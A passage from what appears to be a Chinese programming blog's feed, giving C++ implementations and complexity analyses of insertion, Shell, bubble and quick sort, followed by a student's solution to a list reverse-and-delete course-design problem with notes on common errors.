class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InsertSort</span><span class="hljs-params">(SqList &amp;L)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//对顺序表L做直接插入排序</span><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=L.length;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(L.r[i]&lt;L.r[i<span class="hljs-number">-1</span>])<br>&#123;<br>L.r[<span class="hljs-number">0</span>]=L.r[i];<span class="hljs-comment">//r[i]暂存到监视哨中</span><br>L.r[i]=L.r[i<span class="hljs-number">-1</span>];<span class="hljs-comment">//r[i-1]后移</span><br><span class="hljs-comment">//记录逐个后移，直到找到插入位置</span><br><span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-2</span>;L.r[<span class="hljs-number">0</span>]&lt;L.r[j];j--)<br>L.r[j+<span class="hljs-number">1</span>]=L.r[j];<br>L.r[j+<span class="hljs-number">1</span>]=L.r[<span class="hljs-number">0</span>];<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>常见错误^by小胡^：<br>1）低位输出随机数。（记录逐个后移，找到插入位置）三行代码的位置放在了if语句外，导致即便低位符合降序，但仍执行代码，致溢出。</p><p> 直接插入排序算法分析：</p><ul><li>最好的情况是记录序列按关键字有序</li><li>比较次数n-1；移动次数0</li><li>最坏的情况是记录序列按关键字逆序</li><li>比较次数(n+2)(n-1)/2；移动次数(n+4)(n-1)/2</li><li>平均情况下比较次数和移动次数约为n^2^/4,时间复杂度为O(N^2^)</li><li>直接插入排序容易实现，是稳定排序</li><li>直接插入排序也适用于链式结构，不需要移动</li><li>适用于初始基本有序的情况</li></ul><hr><p><strong>希尔排序法是直接插入法的优化，它的思想是先将整个排序序列分成若干子序列，并分别进行直接插入排序，当整个记录中的序列基本有序时，再对全体记录进行一次直接插入排序。</strong></p><p>希尔排序法的描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ShellInsert</span><span class="hljs-params">(SqList&amp; L, <span class="hljs-keyword">int</span> dk)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//对顺序表 L 做一趟增量是 dk 的希尔插入排序</span><br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = dk + <span class="hljs-number">1</span>; i &lt;= L.length; ++i)<br>&#123;<br><span class="hljs-keyword">if</span> (L.r[i] &lt; L.r[i - dk]) &#123;<br><span class="hljs-comment">//需将 L.r[i] 插入有序增量子表</span><br>L.r[<span class="hljs-number">0</span>] = L.r[i]; <span class="hljs-comment">//暂存在L.r[0]</span><br><span class="hljs-keyword">for</span> (j = i - dk; j &gt; <span class="hljs-number">0</span> &amp;&amp; L.r[<span class="hljs-number">0</span>] &lt; L.r[j]; j -= dk)<br>L.r[j + dk] = L.r[j];<span class="hljs-comment">//记录后移</span><br>L.r[j + dk] = L.r[<span class="hljs-number">0</span>];<span class="hljs-comment">//将 r[0] 插入</span><br>&#125;<span class="hljs-comment">//if</span><br>&#125;<span class="hljs-comment">//for</span><br>&#125;<span class="hljs-comment">//ShellInsert</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ShellSort</span><span class="hljs-params">(SqList&amp; L, <span class="hljs-keyword">int</span> dt[], <span class="hljs-keyword">int</span> t)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//按增量序列 dt[0..t-1] 对顺序表 L 作 t 趟希尔排序</span><br><span class="hljs-keyword">int</span> k;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; t; ++k)<br>ShellInsert(L, dt[k]);<br>&#125;<br></code></pre></td></tr></table></figure><p>希尔排序法算法分析：</p><ul><li>时间复杂度取决于增量序列，可到 O(N ^4/3^ )，优于直接插入排序</li><li> 如何选择最佳 d序列，目前尚未解决，但增量系列应该无公因子，最后一个增量值必须为 1 </li><li>空间复杂度为 O(1) </li><li>记录跳跃移动导致排序方法不稳定</li><li>只能用于顺序结构，不能用于链式结构</li></ul><blockquote><p>利用希尔排序解决如下问题：<br>输入<br>输入的第一行包含1个正整数n，表示共有n个整数需要参与排序。其中n不超过1000。<br>第二行包含n个用空格隔开的正整数，表示n个需要排序的整数.<br>输出<br>只有1行，包含n个整数，表示从小到大排序完毕的所有整数。<br>请在每个整数后输出一个空格，并请注意行尾输出换行。<br>样例输入<br>10<br>2 8 4 6 1 10 7 3 5 9<br>样例输出<br>1 2 3 4 5 6 7 8 9 10 </p></blockquote><p>下面是源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KeyType int</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXSIZE 1000</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>KeyType r[MAXSIZE+<span class="hljs-number">1</span>];<br><span class="hljs-keyword">int</span> length;<br>&#125;SqList;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ShellInsert</span><span class="hljs-params">(SqList&amp; L, <span class="hljs-keyword">int</span> dk)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//对顺序表 L 做一趟增量是 dk 的希尔插入排序</span><br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = dk + <span class="hljs-number">1</span>; i &lt;= L.length; ++i)<br>&#123;<br><span class="hljs-keyword">if</span> (L.r[i] &lt; L.r[i - dk]) &#123;<br><span class="hljs-comment">//需将 L.r[i] 插入有序增量子表</span><br>L.r[<span class="hljs-number">0</span>] = L.r[i]; <span class="hljs-comment">//暂存在L.r[0]</span><br><span class="hljs-keyword">for</span> (j = i - dk; j &gt; <span class="hljs-number">0</span> &amp;&amp; L.r[<span class="hljs-number">0</span>] &lt; L.r[j]; j -= dk)<br>L.r[j + dk] = L.r[j];<span class="hljs-comment">//记录后移</span><br>L.r[j + dk] = L.r[<span class="hljs-number">0</span>];<span class="hljs-comment">//将 r[0] 插入</span><br>&#125;<span class="hljs-comment">//if</span><br>&#125;<span class="hljs-comment">//for</span><br>&#125;<span class="hljs-comment">//ShellInsert</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ShellSort</span><span class="hljs-params">(SqList&amp; L, <span class="hljs-keyword">int</span> dt[], <span class="hljs-keyword">int</span> t)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//按增量序列 dt[0..t-1] 对顺序表 L 作 t 趟希尔排序</span><br><span class="hljs-keyword">int</span> k;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; t; ++k)<br>ShellInsert(L, dt[k]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span> &gt;&gt; n;<br>SqList L;<br><span class="hljs-keyword">int</span> dlta[<span class="hljs-number">1000</span>];<br>L.length = n;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-built_in">cin</span> &gt;&gt; L.r[i];<br>dlta[i - <span class="hljs-number">1</span>] = n-i;<br>&#125;<br>ShellSort(L,dlta,n);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br><span class="hljs-built_in">cout</span> &lt;&lt; L.r[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p><strong>冒泡排序排序法，相邻元素之间进行比较，如果逆序则交换位置。</strong></p><p>冒泡排序法的描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BubbleSort</span><span class="hljs-params">(SqList &amp;L)</span></span><br><span class="hljs-function"> </span>&#123;<span class="hljs-comment">//对顺序表L做冒泡排序</span><br> m = L.length − <span class="hljs-number">1</span>;<br> flag = <span class="hljs-number">1</span>;<span class="hljs-comment">//用来标记某一趟排序是否发生交换</span><br> <span class="hljs-keyword">while</span>((m &gt; <span class="hljs-number">0</span>) &amp;&amp; (flag == <span class="hljs-number">1</span>)) &#123;<br> flag = <span class="hljs-number">0</span>; <span class="hljs-comment">//没有发生交换</span><br> <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>; j &lt;= m; j++)<br> <span class="hljs-keyword">if</span>(L.r[j].key &gt; L.r[j + <span class="hljs-number">1</span>].key) &#123;<br> flag = <span class="hljs-number">1</span>;<span class="hljs-comment">//表示本趟排序发生了交换</span><br> t = L.r[j];<br> L.r[j] = L.r[j + <span class="hljs-number">1</span>];<br> L.r[j + <span class="hljs-number">1</span>] = t;<span class="hljs-comment">//交换前后两个记录</span><br> &#125;<span class="hljs-comment">//if</span><br> −−m;<br> &#125;<span class="hljs-comment">//while</span><br>&#125;<span class="hljs-comment">//BubbleSort</span><br></code></pre></td></tr></table></figure><p><strong>实际上此冒泡排序是对原冒泡排序的一种优化，flag标识符实现了优化。<br>例如：1 2 5 3 7 8 9 10<br>原冒泡排序要比较7趟，而此冒泡排序只需比较3趟。</strong></p><p>下面贴上原冒泡排序算法描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BubbleSort</span><span class="hljs-params">(SqList &amp;L)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, j，temp;<br>    <span class="hljs-keyword">int</span> m=L.length<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= m; j++)<br>        <span class="hljs-keyword">if</span> (L.r[j] &gt; L.r[j + <span class="hljs-number">1</span>])<br>        &#123;<br>            temp = L.r[j];<br>            L.r[j] = L.r[j + <span class="hljs-number">1</span>];<br>            L.r[j + <span class="hljs-number">1</span>] = temp;<br>        &#125;<br>        --m;<br>&#125;<br></code></pre></td></tr></table></figure><p>冒泡排序算法分析:</p><ul><li>最好情况下初始有序，只需一趟排序，比较次数为n-1，不需要移动记录</li><li> 最坏情况是初始逆序，需 n-1 趟排序</li><li>比较的次数：n(n-1)/2;移动的次数：3n(n-1)/2 </li><li> 平均时间复杂度为 O(n 2 ) </li><li>辅助空间复杂度为 O(1)</li><li>是一种稳定的排序方法，可用于链式存储结构</li></ul><hr><p><strong>快速排序法是最常用的一种排序方法，同时也是很典型的分治思想，分而治之。它的排序思路如下：</strong></p><p><strong>1.任取一个记录作为枢轴<br>2.划分：所有比枢轴小的记录一律前放，比枢轴大的记录一律后放，形成左右两个子表<br>3.对子表重新进行前两步操作，直到每个子表元素只剩一个</strong></p><p>快速排序法算法描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Partition</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-keyword">int</span> low,<span class="hljs-keyword">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//对表 r[low..high] 进行一趟排序，返回枢轴位置</span><br>L.r[<span class="hljs-number">0</span>]=L.r[low]; <span class="hljs-comment">//子表的第一个记录做枢轴</span><br>pivotkey=L.r[low];<br><span class="hljs-keyword">while</span>(low&lt;high)&#123;<span class="hljs-comment">//从表两端交替向中间扫描</span><br><span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;L.r[high]&gt;=pivotkey)<br>−−high;<br>L.r[low]=L.r[high];<span class="hljs-comment">//比枢轴小的移到低端</span><br> <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;L.r[low]&lt;=pivotkey)<br> ++low;<br> L.r[high]=L.r[low];<span class="hljs-comment">//比枢轴大的移到高端</span><br> &#125;<span class="hljs-comment">//while</span><br> L.r[low]=L.r[<span class="hljs-number">0</span>]; <span class="hljs-comment">//枢轴记录到位</span><br> <span class="hljs-keyword">return</span> low; <span class="hljs-comment">//返回枢轴位置</span><br>&#125;<span class="hljs-comment">//Partition</span><br> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">QSort</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-keyword">int</span> low, <span class="hljs-keyword">int</span> high)</span></span><br><span class="hljs-function"> </span>&#123; <span class="hljs-comment">//对顺序表 L 中的子序列 L.r[low..high] 做快速排序</span><br> <span class="hljs-keyword">if</span>(low &lt; high) &#123; <span class="hljs-comment">//长度大于1</span><br> pivotloc = Partition(L, low, high);<br> QSort(L, low, pivotloc − <span class="hljs-number">1</span>);<span class="hljs-comment">//左子表排序</span><br> QSort(L, pivotloc + <span class="hljs-number">1</span>, high);<span class="hljs-comment">//右子表排序</span><br> &#125;<span class="hljs-comment">//if</span><br> &#125;<span class="hljs-comment">//QSort</span><br> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">QuickSort</span><span class="hljs-params">(SqList &amp;L)</span></span><br><span class="hljs-function"> </span>&#123; <span class="hljs-comment">//对顺序表L做快速排序</span><br> QSort(L, <span class="hljs-number">1</span>, L.length);<br> &#125;<span class="hljs-comment">//QuickSort</span><br></code></pre></td></tr></table></figure><p>快速排序算法分析：</p><ul><li>性能最好情况是均匀划分，时间复杂度是 O(nlog <em>2</em> n)。</li><li>性能最差情况如初始序列有序，导致最不均匀划分，性能退至O(n ^2^)。</li><li>为避免最坏情况发生，可以三者取中，即头、尾和中间记录三者中关键字居中的记录作为枢轴</li><li>可以证明，平均计算时间是 O(nlog  n)。</li><li>实验结果表明：就平均计算时间而言，快速排序是所有内部排序方法中最好的一个。</li><li>辅助空间复杂度取决于栈的层次，最坏 O(n), 最好O(log <em>2</em> n)。</li><li>快速排序不稳定，不适用于链表结构。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构课程设计之大爱线性表</title>
      <link href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%A4%A7%E7%88%B1%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%A4%A7%E7%88%B1%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>2020数据结构课程设计之大爱线性表</p><blockquote><p>大爱线性表<br>不少参赛同学刚学数据结构，对线性表最是熟悉不过。这里我们给线性表增加两个特殊的操作，第一个是‘R’ 操作，表示逆转整个表，如果表长为L，原来的第i个元素变成第L-i+1个元素。第二个操作是‘D’，表示删除表的第一个元素，如果表为空，则返回一个“error”信息。我们可以给出一系列的‘R’ 和‘D’组合，例如“RDD”表示先逆转表，然后删除最前面的两个元素。</p><p>本题的任务是给定表和一个操作串S，求出执行S后的表，如果中途出现‘D’操作于空表，输出“error”。</p></blockquote><blockquote><p>输入<br>第一行是一个整数，表示有多少组数据。每组测试数据格式如下：</p><p>(1)第一行是操作串S，有‘R’ 和‘D’组成，S的长度大于0，不超过100 000。<br>(2)第二行是整数n，表示初始时表中的元素个数。n的值不小于0，不超过100 000。<br>(3) 第三行是包含n个元素的表，用‘[’ 和 ‘]’括起来，元素之间用逗号分开。各元素值在[1,100]之间。</p></blockquote><p><strong>解题思路：<br>1）对我而言，本题的难点在于如何正确处理输入与输出操作。所以在输入输出问题上要下功夫。<br>2）如何处理R与D呢？此解法用了两个技巧，头尾指针与计数器。头尾指针k，q分别记录数组元素的位置。计数器记录翻转次数，如果翻转次数模2为0，那么相当于没有翻转。如果R一次，D一次，计数器模2为1，那么q++，模拟元素被移出数组。如果计数器模2为0，那么k++。这样操作！</strong></p><p>下面是源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXSIZE 100005</span><br><span class="hljs-comment">//利用数组</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[MAXSIZE];<span class="hljs-comment">//元素</span><br><span class="hljs-keyword">int</span> length;<span class="hljs-comment">//数组长度</span><br>&#125;Arry;<br>Arry L;<br><span class="hljs-keyword">char</span> option[MAXSIZE];<br><span class="hljs-comment">//利用标识符记录翻转次数，如果为偶数，那么相当于没翻转</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clean</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span><span class="hljs-comment">//清空</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>option[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> n,m,length_option,p;<span class="hljs-comment">//n为程序运行次数，m为含有多少个元素，p为输入元素的临时变量,length_option为操作步数</span><br><span class="hljs-built_in">cin</span> &gt;&gt; n;<br><span class="hljs-keyword">while</span> (n)<br>&#123;<br><span class="hljs-keyword">char</span> h;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<span class="hljs-comment">//记录元素录入情况</span><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<span class="hljs-comment">//记录翻转次数</span><br><span class="hljs-keyword">int</span> flag = <span class="hljs-number">0</span>;<span class="hljs-comment">//记录数是否为空</span><br><span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>,q=<span class="hljs-number">0</span>;<span class="hljs-comment">//元素指针，记录位置</span><br><span class="hljs-built_in">cin</span> &gt;&gt; option;<br>length_option = <span class="hljs-built_in">strlen</span>(option);<span class="hljs-comment">//一共有多少个操作步骤</span><br><span class="hljs-built_in">cin</span> &gt;&gt; m;<br>L.length = m;<br><span class="hljs-keyword">if</span> (m)<span class="hljs-comment">//输入部分</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; h)<br>&#123;<br><span class="hljs-keyword">if</span> (h == <span class="hljs-string">&#x27;]&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; p;<br>L.<span class="hljs-built_in">array</span>[i] = p;<br>i++;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cin</span> &gt;&gt; h &gt;&gt; h;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length_option; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (option[i] == <span class="hljs-string">&#x27;R&#x27;</span>)<br>count++;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (option[i] == <span class="hljs-string">&#x27;D&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (!L.length)<br>&#123;<br>flag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>L.length--;<span class="hljs-comment">//数组长度减小</span><br><span class="hljs-keyword">if</span> (count%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)<br>k++;<span class="hljs-comment">//头指针移动位置</span><br><span class="hljs-keyword">else</span> <br>q++;<span class="hljs-comment">//尾指针移动位置</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag==<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;error&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>n--;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(flag==<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[&quot;</span>;<br><span class="hljs-keyword">if</span> (count % <span class="hljs-number">2</span>==<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (i = k; i &lt; m - q; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; L.<span class="hljs-built_in">array</span>[i];<br><span class="hljs-keyword">if</span> (i != m - q<span class="hljs-number">-1</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;,&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = m - q - <span class="hljs-number">1</span>; i &gt;= k; i--)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; L.<span class="hljs-built_in">array</span>[i];<br><span class="hljs-keyword">if</span> (i != k)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;,&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;]&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br>clean(length_option);<br>n--;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>常见错误：<br>1）输出</strong>[]<strong>为空。元素录入出了问题。<br>2）多余逗号。格式控制出了问题。<br>3）应该正序输出却逆序输出，而且少了数字。大概率!(count%2)写成了!count%2这种形式，疏忽运算符优先级导致的错误。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程设计 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构课程设计之单词检查</title>
      <link href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%8D%95%E8%AF%8D%E6%A3%80%E6%9F%A5/"/>
      <url>/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%8D%95%E8%AF%8D%E6%A3%80%E6%9F%A5/</url>
      
